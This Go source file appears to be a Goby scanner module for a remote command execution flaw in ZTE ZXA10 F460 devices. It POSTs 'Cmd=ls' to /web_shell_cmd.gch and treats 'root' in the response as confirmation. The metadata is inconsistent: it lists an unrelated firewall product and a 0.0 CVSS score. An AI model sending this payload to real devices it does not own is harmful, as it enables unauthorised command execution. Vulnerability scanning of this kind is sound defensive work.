package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Zhongxing F460 web_shell_cmd.gch RCE",
  "Description": "Zhongxing F460 web_shell_cmd.gch RCE",
  "Product": "Zhongxing F460",
  "Homepage": "https://www.zte.com.cn/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "app=\"ZTE-ZXA10F460\"",
  "Level": "3",
  "Impact": "RCE",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": false,
  "ExpParams": null,
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["RCE"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["WangKang Next generation firewall"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/web_shell_cmd.gch"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=ls&CmdAck="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    return expResult
		},
	))
}